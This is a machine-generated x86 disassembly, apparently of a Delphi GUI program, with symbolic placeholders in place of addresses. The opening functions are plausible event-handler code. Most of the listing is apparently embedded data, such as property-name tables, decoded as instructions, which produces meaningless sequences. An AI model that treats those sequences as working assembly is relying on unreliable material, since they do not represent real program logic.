lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov ebx eax
lea ecx [ esp + 0x1 ]
mov dl [ esp ]
mov eax ebx
call sub_435618
test al al
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x22c ]
cmp eax [ ebx + 0x23c ]
jle r-xdata
mov al 0x1
mov edx eax
dec edx
mov eax ebx
call sub_4601f8
sub_460cf0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_403e78
cmp [ ebx + 0x2aa ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
push esi
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2ac ]
call [ ebx + 0x2a8 ]
sub_460d30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_403e78
cmp [ ebx + 0x2b2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
push esi
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_460d90
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
sub_460dc0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_460dec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
mov si 0xffc8
call sub_403324
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
mov eax ebx
mov si 0xffc8
call sub_403324
test al al
je r-xdata
mov eax ebx
call sub_4345b8
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax ebx
call sub_4345b8
mov esi eax
sub esi [ ebp - 0xc ]
mov [ ebp - 0xc ] esi
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] eax
xor edx edx
mov eax ebx
call sub_45d234
mov dl 0x1
mov eax ebx
call sub_45d234
sub_460eb0
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_40387c#5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460edc
retn
sub_460eec
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x10
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
cmovbe eax [ eax ]
sbb al 0x10
inc esi
add [ eax ] ch
add al [ eax ]
add [ esp + ecx + 0x43 ] bl
add al ah
cdq
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
inc ebx
add [ esi + edi * 4 + 0x43 ] ah
add al dl
xchg [ ebx ] al
je r-xdata
mov esp 0x461f00ff
add [ eax + 0x1f ] ah
inc esi
add [ edi + ebx + 0x21800046 ] cl
inc esi
add [ eax + 0xb00461f ] bh
push esp
push ebx
jo r-xdata
add [ eax + 0x3000437a ] dl
mov [ ebx ] al
sbb al 0x82
inc ebx
add [ eax ] bl
test [ ebx ] eax
dec eax
add [ ebx ] 0xffffffc8
mov [ ebx ] al
int3
jo r-xdata
inc ecx
add [ eax + 0x20004621 ] cl
push ds
inc esi
add [ ebx + esi * 2 + 0x499c0043 ] al
inc ebx
add al bh
cdq
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0x1cfc0041 0x46
js r-xdata
jb r-xdata
outsb
inc edx
jne r-xdata
add al ah
jno r-xdata
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ ebp + ecx * 4 + 0x6ee40043 ] ah
inc ebx
add ah al
mov cl 0x43
add [ eax - 0x43ffbc4e ] al
push ds
inc esi
add [ edx + esi * 4 + 0x43 ] ah
add ah bh
jae r-xdata
add [ ebx + esi - 0x70f7ffc0 ] al
inc ebx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x4c ] bl
inc ebx
add [ eax - 0x4f ] dh
inc ebx
add [ esi + edi * 4 - 0x421fffbd ] dl
inc ebx
add al bh
inc ebx
add [ eax ] bh
mov ah 0x43
and al [ esi ]
add [ eax ] eax
add [ eax ] al
enter 0x42fd 0x0
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000d ] al
outsd
outsb
jae r-xdata
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
inc edi
insb
jns r-xdata
add bh bh
jl r-xdata
inc edx
jb r-xdata
inc ebx
add [ ecx ] al
outsb
sub al 0x10
inc esi
add [ edi ] al
or edx [ ebx + edx * 2 + 0x70 ]
imul ebp [ esi + 0x42 ] 0x6f747475
outsb
xor al 0xf
inc esi
add [ eax ] dl
adc [ ebx ] al
sub [ eax ] eax
add al 0x53
jo r-xdata
outsb
jne r-xdata
outsd
insb
add [ eax ] dl
inc eax
add [ ecx + 0xff0001 ] ch
mov ch 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ss
add [ ebx ] cl
push eax
popad
jb r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc ah
imul eax [ ebx ] 0x0
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
adc [ eax ] dl
inc ebx
add [ edx + eax ] dl
add [ edx ] bh
add bh bh
jpe r-xdata
push 0x42f5e073
add [ eax ] al
add [ eax + 0x1 ] al
adc [ eax ] al
or eax 0x6e776f44
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
dec esi
jne r-xdata
add [ 0x6e776f44 ] cl
imul ebp [ esi + 0x74 ] 0x40100073
je r-xdata
outsb
push ds
add al bh
cmc
inc edx
add [ ebx ] bl
add bh bh
enter 0x4340 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
and ch bh
inc edx
add [ ecx ] ah
add bh bh
or [ edi ] bh
inc ebx
add [ edi + edi + 0x43 ] ah
add [ eax + 0x3 ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
adc [ eax ] al
cdq
add [ eax ] al
inc [ ecx * 2 + 0x4ccc0043 ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080019 ] al
push 0x6948776f
outsb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax 0x6f460c00
arpl [ ebp + 0x73 ] si
call [ edx + eax ]
jae r-xdata
inc ebx
jne r-xdata
xor eax [ esp + esi * 2 - 0x4a ]
inc ecx
add [ eax + 0x22 ] bl
inc esi
add [ edx + 0x46 ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4409000f ] al
outsd
ja r-xdata
add [ ebp - 0x2f00ffff ] ah
mov ah 0x43
add ah dh
mov ah 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305000e ] al
je r-xdata
add [ eax ] dl
inc eax
push ebx
cld
inc edx
add [ esi * 4 - 0x4a53ffbd ] ch
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ eax + 0x50090018 ] al
outsd
je r-xdata
add bh bh
adc al 0x2
jb r-xdata
jb r-xdata
inc edi
insb
jns r-xdata
outsb
je r-xdata
inc ecx
inc esp
add [ eax + eax ] bh
[ ebx + ecx * 2 + 0x43 ]
call 0x14658db
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5507001c ] al
jo r-xdata
jo r-xdata
outsd
ja r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ edx + 0x28ff0000 ] bl
dec ebp
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ss
add [ esi ] cl
push eax
popad
jb r-xdata
add [ eax ] al
cld
inc edx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
adc [ 0x6f460c00 ] 0x63
jne r-xdata
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
hlt
push r-xdata
shl [ edx ] 0x46
add ah cl
jae r-xdata
insb
jns r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
inc esp
mov ch 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
je r-xdata
imul ebp [ esi + 0x74 ] r-xdata
sub al 0xb5
inc ebx
outsb
je r-xdata
jo r-xdata
inc ebx
outsd
outsb
je r-xdata
dec edi
bound ebp [ ebp - 0x34 ]
add [ ebx ] al
push r-xdata
inc eax
and al [ esi ]
dec esp
and al [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax 0x70550b00
dec esi
outsb
inc esp
outsd
ja r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b001f ] al
mov dh 0x41
add ah bl
and [ esi ] eax
inc ecx
jne r-xdata
jb r-xdata
add [ ebp + esi * 4 + 0x10043 ] ch
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sbb al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
mov ch 0x43
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
dec edi
jbe r-xdata
inc esp
outsd
arpl [ ebx + 0x18 ] bp
add [ ebx ] eax
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
or [ edi + 0x6e ] ecx
call 0xffffffffe9451346
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0020 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090023 ] al
outsb
inc esp
jb r-xdata
popad
inc edi
insb
jns r-xdata
adc [ eax ] al
push ebx
je r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
push ebx
je r-xdata
int3
add [ eax + 0x4f070024 ] al
cmovno eax [ eax ]
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
outsb
inc esp
jb r-xdata
inc [ edx ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0021 ] al
cmovno eax [ eax ]
and [ edx ] al
add bh bh
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ ebx ] cl
dec edi
push 0x40100073
add [ edi ] dl
add bh bh
aam 0x4a
inc ebx
add [ esp + ebp * 2 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xcc656c62
xchg ebx eax
jb r-xdata
cmovno eax [ eax ]
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0600
inc ebp
js r-xdata
add [ ecx ] cl
dec edi
outsb
inc ebp
outsb
add [ ebx ] eax
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
or [ edi + 0x6e ] ecx
inc ecx
add [ esi + edx ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
adc eax 0x15f60046
inc esi
add [ edx + eax ] dh
jb r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
or cl [ edi + 0x6e ]
add [ ebx + esi - 0x1a63ffc0 ] al
inc edx
inc ebx
add [ esi + edi * 4 - 0x421fffbd ] dl
inc ebx
add al bh
inc ebx
add [ eax ] bh
mov ah 0x43
add [ eax - 0x4c ] bl
inc ebx
add [ eax - 0x4f ] dh
inc esi
add [ esi + edi * 4 + 0x43 ] ah
add al dl
xchg [ ebx ] al
je r-xdata
inc esp
jb r-xdata
outsb
push ebp
jo r-xdata
je r-xdata
add [ eax ] al
adc al 0xd6
inc edx
add al ah
cdq
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
xor al 0x2
inc esp
outsd
arpl [ ebx - 0x30 ] bp
add [ ebx ] al
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ ebx ] cl
dec edi
outsb
inc edx
add [ edx ] cl
inc edx
add [ eax + 0x680042e0 ] bh
loopne r-xdata
add [ eax + 0x3000437a ] dl
mov [ ebx ] al
sbb [ 0xffffffffe3640046 ] ah
inc edx
add [ 0xffffffff88c80046 ] dh
inc ebx
add ah cl
mov [ ebx ] al
test [ edi - 0x1b87ffbd ] al
inc edx
add [ ebx + esi * 4 - 0x6e8bffbd ] ah
inc ebx
add [ ebp + eax * 8 + 0x43 ] dl
add [ eax ] ah
mov al 0x43
add [ eax ] dl
mov bl 0x43
add [ eax ] dl
fild [ edx ]
mov al ah
inc edx
add [ eax + 0x42 ] al
jo r-xdata
add [ esp + ebp * 2 + 0x43 ] ah
add [ eax + eax * 2 + 0x73840043 ] al
inc ebx
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0x22d80041 0x46
js r-xdata
inc ecx
inc eax
add [ ebp + 0x30c00042 ] bl
inc eax
add ah bl
xor [ eax ] al
fsub [ ebx ]
int3
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
in eax 0x42
insb
imul esp [ ebx + 0x6b ] 0x14d0c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ ebx ]
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ebx ] cl
dec edi
outsb
add [ esp + 0x46 ] dl
add [ ecx ] cl
push esp
push ebx
jo r-xdata
add [ ecx ] bl
inc edx
add [ eax - 0x1f ] dh
inc edx
add [ eax - 0x27ffb9dc ] cl
inc esi
add [ eax ] cl
daa
inc esi
add [ eax ] cl
add [ 0x1bb01a00 ] al
mov al 0x2
add eax [ eax ]
add edi ebp
add ah bl
and eax [ esi ]
mov esi 0x86d00043
inc ebx
add [ esi + edi + 0x41 ] dh
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ eax ] dh
fild [ edx ]
mov esp 0x1000433f
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ ebp + ecx * 4 + 0x6ee40043 ] ah
inc ebx
add ah al
mov cl 0x43
add [ eax + 0x7c0043b2 ] al
lodsd [ esi ]
inc ebx
add [ edx + esi * 4 + 0x43 ] ah
add ah bh
jae r-xdata
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ edi ] cl
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
inc ebp
imul esi [ fs : esp + eax + 0x16 ] 0x9070046
push esp
push ebx
jo r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ah 0xff
outsd
push cs
add [ eax ] cl
inc ecx
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
outsb
inc ebp
imul esi [ fs : eax + edx * 8 + 0x14 ] 0xd7880046
inc edx
add [ eax + eax ] dh
add al 0x53
jo r-xdata
add bh bh
push esp
dec ebp
inc ebx
add [ eax + 0x4d ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
push ebx
imul edi [ edx + 0x65 ] sub_41a8c4
jo r-xdata
outsb
sub [ eax ] eax
and ch bh
inc edx
add [ ecx ] ah
add bh bh
or [ edi ] bh
inc ebx
add [ edi + edi + 0x43 ] ah
add [ eax + 0x3 ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
std
inc edx
add [ eax + eax ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x75410a00
je r-xdata
add bh bh
xor [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jb r-xdata
add [ eax ] dl
inc eax
push ebx
insb
outsb
je r-xdata
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc ah
imul eax [ ebx ] 0x0
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
lodsd [ fs : esi ]
adc al 0x0
or eax 0x74696445
outsd
jb r-xdata
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dh
add al [ eax ]
push [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ ebp - 0x2f00ffff ] ah
mov ah 0x43
add ah dh
mov ah 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
je r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
xor eax [ eax - 0xb ]
inc edx
add [ edx ] bh
add bh bh
jpe r-xdata
add [ ecx ] cl
dec ebp
popad
adc [ eax ] al
sub [ edx ] al
add bh bh
sub [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
pop ss
add [ ecx ] cl
dec ecx
outsb
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
adc [ eax ] al
pop edx
add [ eax ] al
outsb
je r-xdata
add [ eax ] cl
dec ebp
popad
js r-xdata
adc [ eax ] al
or [ edx ] al
add bh bh
push 0x10042df
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or [ ebp + 0x61 ] ecx
inc ecx
add [ eax ] ch
add bh bh
test al 0x4c
inc ebx
add [ eax + 0x434c ] bh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
jae r-xdata
outsd
insb
outsd
jb r-xdata
js r-xdata
cmp al 0x10
inc eax
add [ edx + eax ] ah
add bh bh
and al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
or [ ebp + 0x61 ] cl
mov ch 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
or edx [ eax + 0x61 ]
popad
insb
jne r-xdata
lodsd [ esi ]
jb r-xdata
adc [ eax ] al
test eax 0xff0001
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ ecx ] cl
outsb
je r-xdata
jb r-xdata
popad
cmp al 0x10
inc eax
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
sti
inc edx
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc esp
mov ch 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
jo r-xdata
push cs
je r-xdata
jae r-xdata
adc [ eax ] al
mov ah 0x27
inc esi
add [ eax + ebp ] bh
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x56050023 ] al
popad
insb
jne r-xdata
sub al 0xb5
inc ebx
outsb
jne r-xdata
add [ eax ] al
outsb
je r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
loopne r-xdata
insb
bound ebp [ ebp - 0x34 ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9451a2d
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
arpl [ ebx - 0x34 ] bp
cmovno eax [ eax ]
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ edx ] cl
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
cmovno eax [ eax ]
sbb [ edx ] al
add bh bh
sbb [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0800
inc ebx
push 0x65676e61
int3
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
aam 0x4a
inc ebx
add [ esp + ebp * 2 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0xcc656c62
insb
int3
jb r-xdata
adc [ eax ] al
push cs
add al [ eax ]
dec [ eax ]
loopne r-xdata
push eax
cld
inc edx
add [ esi * 4 - 0x4a53ffbd ] ch
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ eax + 0x53080021 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
inc [ ecx * 2 + 0x4ccc0043 ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push 0x6948776f
outsb
je r-xdata
insb
dec ebx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001f ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500a00
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f07002b ] al
outsb
inc ebp
outsb
je r-xdata
inc esp
jb r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
add [ ebp + esi * 4 + 0x10043 ] ch
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
and al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
insb
jns r-xdata
inc ecx
inc esp
add [ eax + eax ] bh
[ ebx + ecx * 2 + 0x43 ]
and [ eax ] al
or [ edx + 0x65 ] dl
popad
dec edi
outsb
add [ eax ] al
outsb
je r-xdata
jns r-xdata
jb r-xdata
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
jo r-xdata
adc [ eax ] al
cdq
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
cmovno eax [ eax ]
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push es
dec edi
jns r-xdata
je r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
or cl [ edi + 0x6e ]
inc [ edx ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
outsb
inc esp
jb r-xdata
push eax
popad
jb r-xdata
adc [ eax ] al
0x28ff0000 0x434d
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ esi ] cl
inc esi
add [ eax - 0x27ffffff ] dl
cwde
inc edx
add al ah
cdq
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add [ ebx + esi + 0x5fbc0040 ] al
inc ebx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah ah
sub [ esi ] al
pushfd
insb
inc ebx
add [ eax + 0x3e740043 ] dl
inc ecx
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
dec ebx
jns r-xdata
int3
loopne r-xdata
jo r-xdata
das
add [ edi ] al
dec edi
inc [ edx ]
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0900
add [ eax + 0x4f06002c ] al
dec edi
jbe r-xdata
shl [ ebx ] 0x1
inc esi
push eax
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_42c460
call sub_42c540
jo r-xdata
add [ eax ] al
add [ esp + ebx + 0x1cc20046 ] dh
test dh bh
inc edx
add al ah
add [ eax ] al
jmp eax
outsb
dec ebx
jns r-xdata
pushad
inc [ edx ]
call 0xffffffffe9451b28
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002f ] al
outsd
ja r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
inc [ edx ]
rol [ eax ] 0x1
